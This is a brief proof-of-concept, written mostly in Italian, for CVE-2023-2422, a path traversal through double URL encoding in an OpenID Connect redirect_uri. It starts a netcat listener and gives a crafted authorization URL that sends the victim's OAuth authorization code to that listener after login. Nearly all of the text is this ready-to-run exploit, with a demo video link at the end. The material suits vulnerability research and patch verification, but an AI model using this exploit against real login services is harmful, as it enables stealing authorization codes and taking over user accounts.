# CVE-2023-2422 Path Traversal Vulnerability via Double URL Encoding

Aviare un listener appare il code

```shell
$ nc -lvnp 1234
```

Nel browser visitare il seguente url e loggarsi

```shell
https://localhost:4200/realms/winted/protocol/openid-connect/auth?
client_id=winted-web&
redirect_uri=https%3A%2F%2Flocalhost%3A4200%2Flogin
%2f%252E%252E%2fvuln?
url=http%3A%2F%2Flocalhost%3A1234&
response_mode=fragment&
response_type=code&scope=openid
```

# Demo

Video demo [qui](https://videolink)
